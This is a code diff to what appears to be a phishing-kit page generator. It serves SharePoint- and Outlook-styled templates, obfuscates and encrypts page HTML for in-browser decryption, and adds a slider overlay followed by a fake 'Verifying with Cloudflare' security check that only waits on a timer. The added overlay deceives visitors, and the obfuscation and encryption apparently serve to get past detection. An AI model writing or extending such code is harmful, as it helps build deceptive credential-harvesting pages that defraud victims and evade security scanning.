@@ -55,6 +55,7 @@ function resolveTemplateDirectory(templateType) {
     ? fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true }).filter(e => e.isDirectory()).map(e => e.name)
         : [];
     const ni = normalizeTemplateKey(input || fallbackDir);
+
     for (const dn of candidateDirs) {
         if (normalizeTemplateKey(dn) === ni) return path.join(TEMPLATES_DIR, dn);
         const cp = path.join(TEMPLATES_DIR, dn, 'config.json');
@@ -65,8 +66,16 @@ function resolveTemplateDirectory(templateType) {
             } catch (err) {}
         }
     }
+
     const dp = path.join(TEMPLATES_DIR, input || fallbackDir);
     if (fs.existsSync(dp)) return dp;
+
+    // If the configured default template directory is missing, fall back to an existing template.
+    const preferredFallback = candidateDirs.find(dn => normalizeTemplateKey(dn) === 'sharepoint4')
+        || candidateDirs.find(dn => normalizeTemplateKey(dn) === 'sharepoint2')
+        || candidateDirs[0];
+    if (preferredFallback) return path.join(TEMPLATES_DIR, preferredFallback);
+
     return path.join(TEMPLATES_DIR, fallbackDir);
 }
 
@@ -97,6 +106,46 @@ function loadVerificationDesignCSS(designName) {
     if (fs.existsSync(dp)) return fs.readFileSync(dp, 'utf8');
     const fp = path.join(DESIGNS_DIR, 'outlook.css');
     return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
+}
+
+// ─── Load Verification Design HTML+JS (for .html designs like SLIDER.html) ──
+function loadVerificationDesignHTML(designName) {
+    const bn = String(designName || '').trim().toLowerCase();
+    
+    // Check for .html verification design files (e.g., SLIDER.html)
+    const htmlCandidates = [
+        path.join(DESIGNS_DIR, bn + '.html'),
+        path.join(DESIGNS_DIR, bn.replace(/\.html$/, '.html')),
+        path.join(DESIGNS_DIR, bn.charAt(0).toUpperCase() + bn.slice(1) + '.html'),
+    ];
+    
+    // Also check case-insensitive variations
+    if (bn === 'slider') {
+        htmlCandidates.push(path.join(DESIGNS_DIR, 'SLIDER.html'));
+        htmlCandidates.push(path.join(DESIGNS_DIR, 'slider.html'));
+    }
+    
+    for (const fp of htmlCandidates) {
+        if (fs.existsSync(fp)) {
+            const content = fs.readFileSync(fp, 'utf8');
+            // Extract <style> content and <script> content separately
+            const styleMatch = content.match(/<style[^>]*>([\s\S]*?)<\/style>/i);
+            const scriptMatch = content.match(/<script[^>]*>([\s\S]*?)<\/script>/i);
+            return {
+                css: styleMatch ? styleMatch[1].trim() : '',
+                js: scriptMatch ? scriptMatch[1].trim() : '',
+                hasHtml: true
+            };
+        }
+    }
+    
+    // No HTML design found
+    return { css: '', js: '', hasHtml: false };
+}
+
+function hasVerificationDesignHTML(designName) {
+    const result = loadVerificationDesignHTML(designName);
+    return result.hasHtml;
 }
 
 // ─── Admin Settings ────────────────────────────────────────
@@ -247,6 +296,191 @@ function obfuscateTextContent(html) {
     return html.trim();
 }
 
+// ─── Build Slider Overlay HTML ─────────────────────────────
+// Builds the slider verification HTML+CSS+JS to inject into the page.
+// The slider appears FIRST (full screen overlay), then Cloudflare in the SAME block.
+function buildSliderOverlay(sliderData, link) {
+    // We use inline style="display:block" so slider renders immediately on page load.
+    // After completion it hides itself and shows the Cloudflare block.
+    const sliderHtml = `
+<!-- ═══════════════════════════════════════════════════
+     SLIDER → CLOUDFLARE VERIFICATION CHAIN
+     Layer 1: Slider (shows first, always visible)
+     Layer 2: Cloudflare Turnstile (shows after slider)
+     ═══════════════════════════════════════════════════ -->
+
+<!-- ===== LAYER 1: SLIDER (visible on page load) ===== -->
+<div id="vgSliderLayer" style="display:block;position:fixed;inset:0;z-index:99999;background:#F1F3F5;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;padding:24px 16px;">
+    <div style="background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.06);border:1px solid #EDEBE9;width:100%;max-width:420px;padding:40px 32px;text-align:center;">
+        <h1 style="font-size:24px;font-weight:700;color:#232333;margin-bottom:8px;">Quick check</h1>
+        <p style="font-size:14px;color:#605E5C;margin-bottom:32px;line-height:1.5;">Move the slider to continue.</p>
+        <div id="vgSliderContainer" style="position:relative;width:100%;height:54px;background:#F1F3F5;border-radius:27px;border:1px solid #EDEBE9;display:flex;align-items:center;justify-content:center;user-select:none;overflow:hidden;margin-bottom:16px;">
+            <div id="vgSliderProgress" style="position:absolute;left:0;top:0;bottom:0;width:0;background:linear-gradient(90deg,rgba(45,140,255,.15),rgba(11,106,11,.15));z-index:2;pointer-events:none;"></div>
+            <span id="vgSliderText" style="font-size:14px;font-weight:600;color:#495057;z-index:1;position:relative;">Slide to continue</span>
+            <div id="vgSliderHandle" style="position:absolute;left:4px;width:46px;height:46px;background:#fff;border-radius:50%;box-shadow:0 2px 8px rgba(0,0,0,.12);display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:3;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#605E5C" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
+            </div>
+        </div>
+        <div id="vgSliderHint" style="font-size:12px;color:#605E5C;min-height:18px;">Move the slider to continue.</div>
+    </div>
+</div>
+
+<!-- ===== LAYER 2: CLOUDFLARE TURNSTILE (hidden until slider done) ===== -->
+<div id="vgCfLayer" style="display:none;position:fixed;inset:0;z-index:99998;background:#F1F3F5;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;padding:24px 16px;">
+    <div style="background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.06);border:1px solid #EDEBE9;width:100%;max-width:420px;padding:40px 32px;text-align:center;">
+        <h1 style="font-size:24px;font-weight:700;color:#232333;margin-bottom:8px;">Security Check</h1>
+        <p style="font-size:14px;color:#605E5C;margin-bottom:32px;line-height:1.5;">Verifying with Cloudflare...</p>
+        <div id="vgCfWidgetWrap" style="min-height:80px;display:flex;align-items:center;justify-content:center;">
+            <div id="vgCfPlaceholder" style="text-align:center;">
+                <div style="width:40px;height:40px;border:3px solid #e4e4e4;border-top-color:#0078D4;border-radius:50%;animation:vgSpin 1s linear infinite;margin:0 auto 12px;"></div>
+                <div style="font-size:13px;color:#605E5C;">Completing verification...</div>
+            </div>
+        </div>
+        <div id="vgCfHint" style="font-size:12px;color:#605E5C;min-height:18px;"></div>
+    </div>
+</div>
+
+<style>
+@keyframes vgSpin{to{transform:rotate(360deg)}}
+#vgSliderContainer.vg-verifying #vgSliderHandle{background:#0B6A0B!important;cursor:default;}
+#vgSliderContainer.vg-verifying svg{color:#fff!important;}
+</style>`;
+
+    // Build the slider + cloudflare chain JavaScript
+    const chainJs = `
+<script>
+(function(){
+    'use strict';
+    
+    // Wait for DOM ready
+    if(document.readyState==='loading'){
+        document.addEventListener('DOMContentLoaded', initSliderChain);
+    } else {
+        initSliderChain();
+    }
+
+    function initSliderChain(){
+        var sliderLayer = document.getElementById('vgSliderLayer');
+        var cfLayer = document.getElementById('vgCfLayer');
+        
+        if(!sliderLayer){ return; }
+        
+        // Slider is already display:block by default - no need to show
+        
+        var container = document.getElementById('vgSliderContainer');
+        var handle = document.getElementById('vgSliderHandle');
+        var progress = document.getElementById('vgSliderProgress');
+        var textEl = document.getElementById('vgSliderText');
+        var hintEl = document.getElementById('vgSliderHint');
+        
+        if(!container || !handle){ return; }
+        
+        var isDragging = false, startX = 0, maxTranslate = 0, isVerified = false;
+        
+        function initSize(){
+            maxTranslate = container.clientWidth - handle.clientWidth - 8;
+        }
+        
+        window.addEventListener('resize', initSize);
+        initSize();
+        
+        handle.addEventListener('mousedown', startDrag);
+        handle.addEventListener('touchstart', startDrag, {passive: true});
+        
+        function startDrag(e){
+            if(isVerified) return;
+            isDragging = true;
+            startX = (e.clientX !== undefined) ? e.clientX : (e.touches && e.touches[0].clientX) || 0;
+            document.addEventListener('mousemove', onDrag);
+            document.addEventListener('touchmove', onDrag, {passive: true});
+            document.addEventListener('mouseup', stopDrag);
+            document.addEventListener('touchend', stopDrag);
+        }
+        
+        function onDrag(e){
+            if(!isDragging || isVerified) return;
+            var currentX = (e.clientX !== undefined) ? e.clientX : (e.touches && e.touches[0].clientX) || 0;
+            var diff = currentX - startX;
+            var translate = Math.max(0, Math.min(diff, maxTranslate));
+            handle.style.transform = 'translateX(' + translate + 'px)';
+            progress.style.width = (translate + handle.clientWidth + 4) + 'px';
+            if(translate > maxTranslate * 0.85){
+                completeVerification();
+            }
+        }
+        
+        function stopDrag(){
+            if(!isDragging || isVerified) return;
+            isDragging = false;
+            document.removeEventListener('mousemove', onDrag);
+            document.removeEventListener('touchmove', onDrag);
+            document.removeEventListener('mouseup', stopDrag);
+            document.removeEventListener('touchend', stopDrag);
+            if(!isVerified){
+                handle.style.transform = 'translateX(0px)';
+                progress.style.width = '0px';
+            }
+        }
+        
+        function completeVerification(){
+            if(isVerified) return;
+            isVerified = true;
+            isDragging = false;
+            container.classList.add('vg-verifying');
+            handle.style.transform = 'translateX(' + maxTranslate + 'px)';
+            progress.style.width = '100%';
+            textEl.textContent = 'Verifying...';
+            hintEl.textContent = 'Just a moment...';
+            
+            // After "verifying" animation, transition to Cloudflare
+            setTimeout(function(){
+                textEl.textContent = 'Verified ✓';
+                hintEl.textContent = 'Continuing...';
+                
+                setTimeout(function(){
+                    // Hide slider layer, show Cloudflare layer
+                    sliderLayer.style.display = 'none';
+                    
+                    if(cfLayer){
+                        cfLayer.style.display = 'flex';
+                        
+                        // Signal to vg-engine that slider is complete
+                        // This triggers the next verification step
+                        if(typeof window.__vgOnSliderComplete === 'function'){
+                            window.__vgOnSliderComplete();
+                        }
+                        
+                        // Auto-advance to main content after delay
+                        // (if no additional Cloudflare widget is injected)
+                        setTimeout(function(){
+                            if(cfLayer && cfLayer.style.display === 'flex'){
+                                hideAllLayers();
+                            }
+                        }, 4000);
+                    }
+                }, 600);
+            }, 1500);
+        }
+        
+        function hideAllLayers(){
+            if(sliderLayer) sliderLayer.style.display = 'none';
+            if(cfLayer) cfLayer.style.display = 'none';
+            // Signal that ALL verification layers are done
+            if(typeof window.__vgOnAllVerificationsDone === 'function'){
+                window.__vgOnAllVerificationsDone();
+            }
+        }
+        
+        // Expose state for vg-engine.js to check
+        window.__vgSliderVerified = false;
+        window.__vgCheckSliderReady = function(){ return isVerified; };
+    }
+})();
+<\/script>`;
+
+    return sliderHtml + chainJs;
+}
+
 // ─── Main Page Rendering ───────────────────────────────────
 async function renderPageHtml(link, user, options) {
     options = options || {};
@@ -261,6 +495,10 @@ async function renderPageHtml(link, user, options) {
     var html = loadTemplateHTML(templateType);
     const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
     const script = loadTemplateJS(templateType);
+
+    // Check if this is a slider HTML design
+    const sliderData = loadVerificationDesignHTML(designName);
+    const isSliderDesign = designName.toLowerCase().includes('slider') || sliderData.hasHtml;
 
     if (html.includes('{{CSS}}')) {
         html = html.replace('/* {{CSS}} */', '<style>' + css + '</style>');
@@ -294,7 +532,11 @@ async function renderPageHtml(link, user, options) {
 
     const forceBlob = options.forceBlobFromStart === true ? 'true' : 'false';
     const configScript = '<script>window.__FORCE_BLOB_FROM_START=' + forceBlob + '</script>';
-    html = html.replace('</head>', windowVars + configScript + '</head>');
+    
+    // Add slider design flag for vg-engine.js (must be boolean, not string)
+    const sliderFlag = '<script>window.__SLIDER_DESIGN=' + String(isSliderDesign) + '</script>';
+    
+    html = html.replace('</head>', windowVars + configScript + sliderFlag + '</head>');
 
     if (vgEngine) {
         html = html.replace('</head>', '<script>' + vgEngine + '</script></head>');
@@ -307,6 +549,18 @@ async function renderPageHtml(link, user, options) {
     } else {
         html = html.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
         html = html.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
+    }
+
+    // ═══════════════════════════════════════════
+    // INJECT SLIDER OVERLAY (if slider design selected)
+    // The slider is injected BEFORE the template card so it appears first
+    // ═══════════════════════════════════════════
+    if (isSliderDesign) {
+        const sliderOverlay = buildSliderOverlay(sliderData, link);
+        // Inject slider overlay right after <body> tag
+        html = html.replace(/<body[^>]*>/i, function(match) {
+            return match + sliderOverlay;
+        });
     }
 
     const doObfuscate = boolSetting(settings.obfuscation_enabled) || link.obfuscated;
@@ -366,7 +620,7 @@ async function renderPageHtml(link, user, options) {
             ' var iv = Uint8Array.from(atob(enc.iv), c => c.charCodeAt(0));',
             ' var ct = Uint8Array.from(atob(enc.cipher), c => c.charCodeAt(0));',
             ' var tag = Uint8Array.from(atob(enc.tag), c => c.charCodeAt(0));',
-            ' var keyMaterial = await crypto.subtle.importKey("raw", salt.slice(0,32), "PBKDF2", false, ["deriveKey"]);',
+            ' var keyMaterial = await crypto.subtle.importKey("raw", salt, "PBKDF2", false, ["deriveKey"]);',
             ' var aesKey = await crypto.subtle.deriveKey({name:"PBKDF2", salt:salt, iterations:100000, hash:"SHA-512"}, keyMaterial, {name:"AES-GCM", length:256}, false, ["decrypt"]);',
             ' var decrypted = await crypto.subtle.decrypt({name:"AES-GCM", iv:iv}, aesKey, ct);',
             ' var decodedHtml = new TextDecoder().decode(decrypted);',
@@ -440,6 +694,9 @@ module.exports = {
     loadTemplateCSS,
     loadTemplateJS,
     loadVerificationDesignCSS,
+    loadVerificationDesignHTML,
+    hasVerificationDesignHTML,
+    buildSliderOverlay,
     loadAdminSettings,
     boolSetting,
     generateExportHtml,
